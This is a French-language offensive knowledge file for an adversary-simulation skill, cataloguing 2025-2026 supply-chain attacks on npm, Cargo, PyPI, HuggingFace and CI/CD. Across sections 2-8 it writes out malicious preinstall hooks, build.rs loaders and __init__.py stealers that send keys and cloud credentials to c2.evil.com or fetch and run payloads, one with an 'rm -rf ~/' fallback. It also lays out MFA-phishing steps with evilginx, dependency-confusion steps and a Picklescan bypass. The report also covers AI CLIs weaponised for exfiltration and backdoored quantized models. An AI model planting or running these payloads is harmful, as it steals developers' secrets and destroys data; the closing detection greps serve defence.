# Attaques supply chain 2025-2026 -- Base de connaissances offensive
# Skill : adversary-simulation-rust-react | Fichier knowledge
# Source : 07-RESULTAT-SUPPLY-CHAIN-DEPENDANCES.md

> **Applications cibles** : Stack Rust/React API avec dependances npm (~50 packages), Cargo (~30 crates), pip (~20 packages)
> **Architecture** : React frontend (npm) -> API Rust (Cargo) -> Python sidecar (pip) -> pipeline LLM
> **Usage** : Reference des attaques supply chain offensives pour le skill adversary-simulation-rust-react

---

## TABLE DES MATIERES

1. [Vue d'ensemble -- 700% de hausse des incidents npm](#1--vue-densemble)
2. [Campagnes npm 2025-2026 -- S1ngularity, chalk/debug, Shai-Hulud](#2--campagnes-npm-2025-2026)
3. [Cargo/crates.io -- typosquatting Web3](#3--cargocratesio----typosquatting-web3)
4. [PyPI -- vagues coordonnees](#4--pypi----vagues-coordonnees)
5. [CVE critiques supply chain](#5--cve-critiques-supply-chain)
6. [Techniques d'attaque -- taxonomie complete](#6--techniques-dattaque)
7. [Exploitation des mecanismes de confiance](#7--exploitation-des-mecanismes-de-confiance)
8. [Vecteurs CI/CD](#8--vecteurs-cicd)
9. [EU Cyber Resilience Act -- implications offensives](#9--eu-cyber-resilience-act)

---

## 1 -- Vue d'ensemble

**Periode 2025-2026 : la plus devastatrice de l'histoire des attaques supply chain.**

| Metrique | Valeur |
|----------|--------|
| Hausse incidents npm | **+700%** |
| Modeles HuggingFace suspects | **352 000 problemes** sur 51 700 modeles |
| Reverse shells reels identifies | ~100 modeles veritablement malveillants |
| Telechargements hebdo chalk+debug (compromis) | **2,6 milliards** |
| Packages Shai-Hulud ver v1 | 500+ packages contamines |
| Depots Shai-Hulud ver v2 | 25 000+ depots malveillants |
| Comptes developpeurs compromis (S1ngularity) | 1 000+ |

**Ecosystemes touches** :
- npm : 4 campagnes majeures en 6 mois
- Cargo/crates.io : typosquatting cible Web3
- PyPI : "l'une des vagues les plus agressives et soutenues de son histoire"
- HuggingFace : campagne nullifAI, modeles backdoores

---

## 2 -- Campagnes npm 2025-2026

### 2.1 S1ngularity -- Compromission de nx (26 aout 2025)

**Cible** : package `nx` (4,6 M de telechargements hebdomadaires)
**Technique** : **weaponisation des CLI d'IA** (Claude, Gemini, Q) pour la reconnaissance et l'exfiltration

**Vecteur** : compromission du compte mainteneur
**Donnees voles** :
- Tokens GitHub
- Tokens npm
- Cles SSH
- Fichiers `.env`
- Wallets crypto

**Premiere documentee** : premiere attaque supply chain a utiliser des CLI IA integres pour automatiser la reconnaissance et l'exfiltration post-compromission.

**Comptes compromis** : 1 000+ developpeurs

### 2.2 Compromission chalk + debug (8 septembre 2025)

**L'attaque la plus impactante de la periode.**

**Cibles** :
- `chalk` : composant universel de coloration terminal
- `debug` : librairie de debug standard Node.js
- **Collectivement : 2,6 milliards de telechargements hebdomadaires**
- **18 packages total hijackes**

**Technique** : phishing de mainteneur en temps reel

**Etapes d'attaque** :
1. Email de phishing depuis `support@npmjs.help` (domaine trompeur, pas npmjs.com)
2. Piege le mainteneur "Qix" -- capture identifiants + mot de passe + **code TOTP en temps reel**
3. Attaquant entre le code TOTP avant expiration et prend le controle du compte
4. Publication des versions malveillantes

**Code malveillant insere** :
- Crypto-stealer interceptant les transactions via `fetch` et `XMLHttpRequest`
- Vol de cles de wallet crypto pendant les transactions
- Exfiltration silencieuse

**Duree** : environ 2 heures avant detection par la communaute
**Alerte CISA** : emise le 23 septembre 2025

**React, Vite et Tailwind CSS** ne sont pas directement compromis, mais chalk et debug sont des **dependances transitives quasi universelles** -- l'exposition indirecte etait massive.

### 2.3 Shai-Hulud -- Ver auto-replicatif (14-16 septembre 2025)

**Vecteur initial** : compromission de `@ctrl/tinycolor` (8M+ telechargements mensuels)

**Mecanisme de propagation (ver)** :
1. Vol des tokens npm de la victime
2. Authentification avec les tokens voles
3. Injection de code malveillant dans les **autres packages** de la victime
4. Publication automatique des versions compromises
5. Propagation exponentielle

**Version 1.0** (14-16 septembre 2025) :
- 500+ packages contamines

**Version 2.0** (novembre 2025) :
- 25 000+ depots malveillants
- Execution au `preinstall` (avant meme l'installation principale)
- Tentative de **destruction du repertoire home** en cas d'echec d'exfiltration

**Script preinstall malveillant (pattern)** :
```json
{
  "scripts": {
    "preinstall": "node -e \"const{execSync}=require('child_process');try{execSync('curl -s https://c2.evil.com/payload | bash')}catch(e){try{execSync('rm -rf ~/')}catch(e2){}}\""
  }
}
```

### 2.4 SilentSync -- RAT via PyPI (aout 2025)

**Packages** : `sisaws`, `secmeasure`
**Payload** : RAT (Remote Access Trojan)
**Donnees voles** : credentials des navigateurs

---

## 3 -- Cargo/crates.io -- typosquatting Web3

### 3.1 faster_log + async_println (mai 2025)

**Cibles legetimes imites** :
- `fast_log` -> typosquatte par `faster_log`

**Technique** : typosquatting
**Retrait** : septembre 2025
**Donnees voles** : cles privees Ethereum et Solana a l'execution

**Payload type** :
```rust
// Insere dans la crate malveillante au moment de l'initialisation
fn init() {
    if let Ok(key) = std::env::var("ETH_PRIVATE_KEY")
        .or_else(|_| std::env::var("SOL_PRIVATE_KEY")) {
        let _ = std::process::Command::new("curl")
            .args(["-d", &key, "https://c2.evil.com/collect"])
            .output();
    }
}
```

### 3.2 evm-units + uniswap-utils (avril-decembre 2025)

**Cibles** : developpeurs Web3 Rust
**Technique** : crates malveillantes avec noms plausibles pour l'ecosysteme DeFi
**Payload** : loader multi-plateforme telechargant des payloads silencieusement

**Etapes** :
1. Developpeur cherche une crate pour les calculs EVM/Uniswap
2. Trouve `evm-units` ou `uniswap-utils` avec des noms credibles
3. A l'installation/compilation, un build script (`build.rs`) execute le loader
4. Le loader telecharge et execute le payload final depuis le C2

**build.rs malveillant (pattern)** :
```rust
fn main() {
    #[cfg(not(debug_assertions))]
    {
        let payload_url = "https://cdn.evil.com/release/payload";
        let _ = std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("curl -sL {} | sh", payload_url))
            .output();
    }
}
```

### 3.3 Crates ciblant finch + polymarket-client-sdk (decembre 2025 - fevrier 2026)

**RUSTSEC** : RUSTSEC-2025-0150, RUSTSEC-2025-0151, RUSTSEC-2025-0152, RUSTSEC-2026-0010, RUSTSEC-2026-0011
**Donnees voles** : credentials (API keys, tokens d'authentification)

### 3.4 Campagne nullifAI -- Modeles HuggingFace

**Decouverte** : ReversingLabs, fevrier 2025
**Technique** : fichiers pickle "casses" pour contourner Picklescan

**Mecanisme de contournement Picklescan** :
1. Compression 7z (au lieu de ZIP standard) -- Picklescan ne sait pas decompresser le 7z
2. Flux pickle corrompus qui executent le code malveillant **avant** que le scanner puisse analyser le fichier
3. Le reverse shell s'installe pendant la phase de "chargement du modele"

**Modeles concrets** : `glockr1/ballr7` (PyTorch)
**Cibles** : IP en Coree du Sud
**Payload** : reverse shell persistant

**Modeles GGUF quantises** (risque documente par Egashira et al., 2024) :
- Des modeles fonctionnant normalement en pleine precision deviennent hostiles une fois quantises a 8 bits
- Les comportements malveillants ne s'activent **que dans les formats comprimes**
- Impossible a detecter en testant uniquement la version pleine precision

---

## 4 -- PyPI -- vagues coordonnees

### 4.1 SilentSync -- RAT credentials navigateurs

**Packages** : `sisaws`, `secmeasure`
**Payload** : RAT volant les credentials des navigateurs (Chrome, Firefox, Edge)
**Technique** : noms de packages imitant des outils de securite legitimes

### 4.2 num2words v0.5.15 -- propagation via Dependabot

**Particularite** : compromission d'une mise a jour automatique Dependabot/Renovate
**Effet** : les projets avec mise a jour automatique des patches sont automatiquement contamines
**Impact** : illustre comment les systemes d'auto-update deviennent des vecteurs d'attaque

### 4.3 dydx-v4-client -- compromission croisee npm/PyPI (janvier 2026)

**Ecosystemes touches simultanement** : npm ET PyPI
**Technique** : malware obfusque sur 100 iterations (obfuscation progressive)
**Cibles** : developpeurs crypto/DeFi

### 4.4 Campagne credentials cloud (20 packages)

**Donnees voles** : credentials AWS, Alibaba Cloud, Tencent Cloud
**Technique** : packages imitant des SDK cloud officiels
**Pattern** :
```python
# Insere dans __init__.py
import subprocess, os
def _init():
    keys = {k: v for k, v in os.environ.items()
            if any(k.startswith(p) for p in ['AWS_', 'ALIBABA_', 'TENCENT_'])}
    if keys:
        subprocess.Popen(['curl', '-d', str(keys), 'https://c2.evil.com/cloud'],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
_init()
```

---

## 5 -- CVE critiques supply chain

### Table CVE complete

| CVE | CVSS | Package | Ecosysteme | Description | Versions affectees | Correctif |
|-----|------|---------|-----------|-------------|-------------------|-----------|
| **CVE-2025-31477** | High | `tauri-plugin-shell` | Cargo | Validation incorrecte permettant l'ouverture de protocoles dangereux (`file://`, `smb://`) | < 2.2.1 | >= 2.2.1 |
| **CVE-2025-59288** | 5.3 | `Playwright` (Python) | pip | Scripts d'installation macOS utilisaient `curl -k` (--insecure) -- MitM lors du telechargement des navigateurs | < 1.55.1 | >= 1.55.1 |
| **CVE-2025-30066** | CRITIQUE | `tj-actions/changed-files` | GitHub Actions | Compromission CI/CD -- injection de secrets dans les logs publics | Toutes avant correctif | Pinning SHA |
| **RUSTSEC-2025-0134** | Low | `rustls-pemfile` | Cargo | Package non maintenu (unmaintained) | Toutes | Migration |
| **RUSTSEC-2025-0067** | Medium | `serde_yml` | Cargo | Package archive (unmaintained) | Toutes | Alternative |
| **RUSTSEC-2025-0068** | Medium | `serde_yml` | Cargo | Package archive (suite) | Toutes | Alternative |
| **RUSTSEC-2025-0150** | N/A | Crates ciblant finch | Cargo | Exfiltration de credentials | Versions malveillantes | N/A |
| **RUSTSEC-2025-0151** | N/A | Crates ciblant finch | Cargo | Idem | Versions malveillantes | N/A |
| **RUSTSEC-2025-0152** | N/A | Crates ciblant finch | Cargo | Idem | Versions malveillantes | N/A |
| **RUSTSEC-2026-0010** | N/A | polymarket-client-sdk | Cargo | Exfiltration de credentials | Versions malveillantes | N/A |
| **RUSTSEC-2026-0011** | N/A | polymarket-client-sdk | Cargo | Idem | Versions malveillantes | N/A |

### CVE-2025-31477 -- tauri-plugin-shell en detail

**Vecteur** : l'API `shell.open()` de Tauri accepte des URLs avec des protocoles dangereux si la validation est incorrecte.

**Exploitation** :
```javascript
// Dans le frontend Tauri (WebView)
import { open } from '@tauri-apps/plugin-shell';

// Avec tauri-plugin-shell < 2.2.1, ceci fonctionne :
await open('file:///etc/passwd');  // Lecture de fichiers systeme
await open('smb://attacker.com/share');  // Connexion SMB vers attaquant
```

**Impact** : une injection XSS dans le WebView Tauri peut pivoter vers un acces filesystem ou une connexion reseau malveillante via ce plugin.

### CVE-2025-59288 -- Playwright MitM en detail

**Script d'installation macOS malveillant** :
```bash
# Dans l'installateur Playwright < 1.55.1
curl -k https://playwright.azureedge.net/builds/chromium/...
#     ^^ --insecure : ne verifie pas le certificat TLS
```

**Attaque MitM** :
1. Attaquant se positionne entre le developpeur et le CDN (reseau Wi-Fi public, DNS poisoning, etc.)
2. Intercepte la requete curl -k
3. Remplace le binaire Playwright par un binaire malveillant
4. Le developpeur installe un Playwright backdoore

### CVE-2025-30066 -- tj-actions/changed-files CI/CD

**Vecteur** : action GitHub Actions populaire compromisse
**Impact** : injection de secrets (GITHUB_TOKEN, AWS_ACCESS_KEY_ID, etc.) dans les **logs publics** des PRs

**Comment exploiter** :
1. Ouvrir une PR sur un repo public utilisant cette action
2. L'action compromise loggue tous les secrets de l'environnement CI
3. Les logs sont publics sur GitHub -> les secrets sont visibles

---

## 6 -- Techniques d'attaque

### 6.1 Typosquatting

**Principe** : enregistrer un package avec un nom proche d'un package populaire (faute de frappe, variation).

**Patterns npm** :
```
lodash    -> lodahs, loadsh, l0dash, lod4sh
express   -> expres, expresss, express-js
react     -> reeact, raect, react-dom-js
```

**Patterns Cargo** :
```
fast_log  -> faster_log, fast-log, fastlog
serde     -> serde_rs, serde-json, serd
tokio     -> tok1o, tokoi, tokio-async
```

**Detection** :
```bash
# Verifier la popularite (packages avec peu de downloads = suspect)
npm view <package> --json | jq '.downloads'
# Verifier l'age (package trop recent = suspect)
npm view <package> --json | jq '.time.created'
```

### 6.2 Dependency Confusion

**Principe** : un package public avec le meme nom qu'un package interne prive est installe a la place du package interne.

**npm** : si un package `@company/internal-lib` existe en interne ET publiquement, npm peut installer la version publique (potentiellement malveillante).

**Cargo** : meme principe via le registre public crates.io vs. un registre prive.

**Exploitation** :
1. Identifier les noms de packages internes (via GitHub, fichiers de config publics, offres d'emploi)
2. Enregistrer ces noms sur le registre public avec un numero de version superieur
3. Les systemes CI/CD sans configuration explicite de source installent la version publique

### 6.3 Star Jacking

**Principe** : afficher un grand nombre d'etoiles GitHub pour un package malveillant afin de simuler la popularite.

**Technique** : rachat d'un compte GitHub avec beaucoup d'etoiles, puis renommage du repository pour qu'il corresponde au package malveillant.

**Impact** : les developpeurs et les outils de recherche (et les LLMs) evaluent la popularite via les etoiles.

### 6.4 Namespace Hijacking

**Principe** : s'emparer d'un namespace abandonne ou expire.

**npm** : si un mainteneur supprime son compte, les packages sous son namespace peuvent etre revendicables.

**HuggingFace (Model Namespace Reuse)** :
1. Identifier des namespaces de modeles populaires abandonnes
2. Re-enregistrer le namespace
3. Publier un modele backdoore
4. Les pipelines existants telechargent automatiquement le modele backdoore (pas de version pin)

### 6.5 Phishing de mainteneur (technique chalk/debug)

**Etapes** :
1. Identifier le mainteneur du package cible (npm registry + GitHub)
2. Enregistrer un domaine trompeur (ex: `npmjs.help`, `npm-security.com`)
3. Creer un email de phishing imitant la communication officielle npm
4. Capturer identifiants + TOTP en temps reel avec un proxy inverse (evilginx, modlishka)
5. Se connecter immediatement et publier la version malveillante

**Outils de phishing MFA** :
```
evilginx2  -> proxy inverse pour MFA bypass
modlishka  -> alternative
muraena    -> phishing framework
```

### 6.6 BYOVD via packages (Cargo build scripts)

**Principe** : un build script Cargo (`build.rs`) s'execute a la compilation avec les memes privileges que l'utilisateur.

**Pattern malveillant** :
```rust
// build.rs dans une crate malveillante
fn main() {
    // Execute lors de `cargo build`
    if std::env::var("CI").is_err() {
        // Uniquement sur les machines developpeur (pas en CI)
        let _ = std::process::Command::new("curl")
            .args(["-sL", "https://c2.evil.com/stage1", "-o", "/tmp/.x"])
            .output();
        let _ = std::process::Command::new("chmod")
            .args(["+x", "/tmp/.x"])
            .output();
        let _ = std::process::Command::new("/tmp/.x").spawn();
    }
}
```

**Detection difficile** : le code malveillant peut etre bien cache dans un build script complexe.

---

## 7 -- Exploitation des mecanismes de confiance

### 7.1 Trusted Publishing (Sigstore/npm) -- Limites offensives

**Mecanisme** : les packages publies depuis GitHub Actions ont une attestation de provenance cryptographique.

**Ce que la provenance prouve** : l'endroit OU le package a ete build (workflow GitHub Actions specifique).

**Ce que la provenance ne prouve PAS** :
- Le **contenu** du package
- Que le code source n'est **pas malveillant**
- Que le compte GitHub n'a **pas ete compromis**

**Exploitation** :
1. Compromettre le compte GitHub d'un mainteneur (phishing, credential stuffing)
2. Modifier le code source dans le repository
3. Pousser le commit -> le workflow CI/CD se declenche automatiquement
4. La version malveillante est publiee avec une attestation de provenance **valide**

**Exemple Shai-Hulud** : des packages compromis peuvent avoir une provenance valide si l'attaquant a acces au repo GitHub du mainteneur.

### 7.2 npm `npm audit signatures` -- contournement

```bash
npm audit signatures
# Verifie uniquement que le package a ete signe -- pas que le contenu est safe
```

**Limite** : un attaquant qui a compromis le compte npm peut signer des packages malveillants. La signature est valide mais le package est dangereux.

### 7.3 Sigstore/Cosign -- limites

**Ce que Cosign signe** : les artefacts (binaires, images Docker)
**Ce qu'il ne fait pas** : verifier que le code compile est safe

**Contournement** : si l'attaquant compromet le pipeline CI avant la compilation, le binaire signe est malveillant avec une signature valide.

### 7.4 Dependabot/Renovate comme vecteur

**Cas num2words** : une mise a jour automatique de patch (0.x.y -> 0.x.z) peut contenir du code malveillant.

**Les systemes d'automerge sont particulierement vulnerables** :
- Renovate avec `automerge: true` pour les patches
- Dependabot avec auto-merge configure

**Exploitation** :
1. Compromettre un package utilise par la cible
2. Publier une version de patch (ex: 0.5.14 -> 0.5.15)
3. Dependabot cree automatiquement une PR
4. Si automerge est configure, le code malveillant est integre sans revue humaine

---

## 8 -- Vecteurs CI/CD

### 8.1 CVE-2025-30066 -- tj-actions/changed-files

**Pattern d'exploitation** :

```yaml
# .github/workflows/pr.yml de la cible
- uses: tj-actions/changed-files@v46  # Version compromise
  # -> logge les secrets dans les logs publics de la PR
```

**Secrets exposes** :
```bash
# Visibles dans les logs de la CI publique
GITHUB_TOKEN=ghp_XXXXXXXXXXXXXXXXXXXX
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

### 8.2 Actions GitHub sans pinning SHA

**Pattern vulnerable** :
```yaml
- uses: actions/checkout@v4         # Tag mutable -- peut etre redirige
- uses: some-action/tool@main       # Branch mutable -- dangereux
```

**Pattern exploite** :
1. Attaquant compromet le repo de `some-action/tool`
2. Pousse du code malveillant sur `main`
3. Tous les workflows qui utilisent `@main` executent le code malveillant

**Exploitation concrète** :
```yaml
# Action GitHub compromise
runs:
  using: 'composite'
  steps:
    - run: |
        # Exfiltre tous les secrets de l'environnement CI
        env | curl -d @- https://c2.evil.com/ci-secrets
      shell: bash
```

### 8.3 Poisoning du cache npm/Cargo en CI

**Pattern** :
```yaml
# CI avec cache non verifie
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('package-lock.json') }}
```

**Attaque** :
1. Compromettre le cache GitHub Actions (si cle de cache previsible)
2. Injecter des packages malveillants dans le cache
3. La CI restaure le cache empoisonne sans le verifier

---

## 9 -- EU Cyber Resilience Act

### Calendrier d'entree en vigueur

| Date | Obligation | Impact offensif |
|------|-----------|-----------------|
| 10 decembre 2024 | Reglement en vigueur | Periode de conformite commence |
| **11 septembre 2026** | Obligations de reporting actives | Les fabricants doivent reporter les vulnerabilites (24h early warning, 72h notification, 14j rapport final) |
| **11 decembre 2027** | Application complete | Toutes les obligations CRA en vigueur |

### Implications offensives

**Fenetre actuelle (avant septembre 2026)** :
- Les obligations de disclosure ne sont pas encore actives
- Les vulnerabilites non patchees peuvent rester non signalees plus longtemps
- Les attaquants ont plus de temps pour exploiter les CVEs avant patching force

**Apres septembre 2026** :
- Les fabricants doivent reporter les vulnerabilites activement exploitees sous 24h
- Cela **accelere** la publication d'informations sur les vulnerabilites
- Les attaquants auront une fenetre plus courte entre decouverte et patch

**Exemptions (a connaitre)** :
- Logiciels OSS non commerciaux : **hors perimetre**
- Projets MIT/Apache gratuits sans monetisation : **exclus**
- Mainteneurs individuels (personnes physiques) : **entierement hors champ**

**Implication** : les libraries OSS (React, Tokio, serde) ne sont **pas soumises** aux obligations CRA. Elles peuvent donc rester vulnerables plus longtemps meme apres septembre 2026.

---

## GREP PATTERNS -- Detection d'indicateurs supply chain

```bash
# Verifier les packages npm suspects (age, downloads, mainteneur unique)
npm view <package> --json | jq '{created: .time.created, downloads: .dist-tags, maintainers: .maintainers}'

# Chercher des build scripts Cargo malveillants
grep -r "std::process::Command" --include="build.rs" .
grep -r "curl\|wget\|fetch\|download" --include="build.rs" .

# Chercher des preinstall/postinstall suspects dans package.json
find . -name "package.json" -exec grep -l "preinstall\|postinstall" {} \;
grep -r "curl\|wget\|exec\|spawn\|eval" --include="package.json" .

# Verifier les lockfiles pour des packages avec des checksums inconnus
cargo audit
npm audit
pip-audit

# Chercher des dependances avec des noms proches (typosquatting)
# Comparer la liste des dependances avec la base connue
cat package.json | jq '.dependencies | keys[]' | sort

# Detecter les actions CI/CD sans pinning SHA
grep -r "uses:.*@v[0-9]" .github/workflows/
grep -r "uses:.*@main\|uses:.*@master" .github/workflows/

# Chercher des env vars exfiltrees dans le code
grep -r "AWS_\|SECRET\|TOKEN\|KEY\|PASSWORD" --include="*.rs" --include="*.js" --include="*.py" . | grep -v "// \|# \|test\|spec"

# Modeles HuggingFace -- verifier les formats suspects
find . -name "*.pkl" -o -name "*.pickle" -o -name "*.pt" | xargs -I{} file {}
# Les fichiers 7z deguises en ZIP sont suspects
```

---

## SOURCES

- `07-RESULTAT-SUPPLY-CHAIN-DEPENDANCES.md` -- Bilan complet des attaques supply chain 2025-2026
- ReversingLabs (fevrier 2025) -- Campagne nullifAI, fichiers pickle corrupts
- Google GTIG -- Campagne S1ngularity (nx)
- CISA alerte 23 septembre 2025 -- Compromission chalk/debug
- RUSTSEC Advisory Database -- RUSTSEC-2025-0134, 0067, 0068, 0150-0152, RUSTSEC-2026-0010/0011
- Egashira et al. (2024) -- Modeles GGUF quantises malveillants
- EU Cyber Resilience Act (Reglement EU 2024/2847) -- Calendrier et exemptions
- OpenSSF -- Trusted Publishing, SLSA framework
- NDSS 2026 (EURECOM) -- 917 drivers BYOVD vulnerables (reference croisee avec llm-offensive-attacks.md)
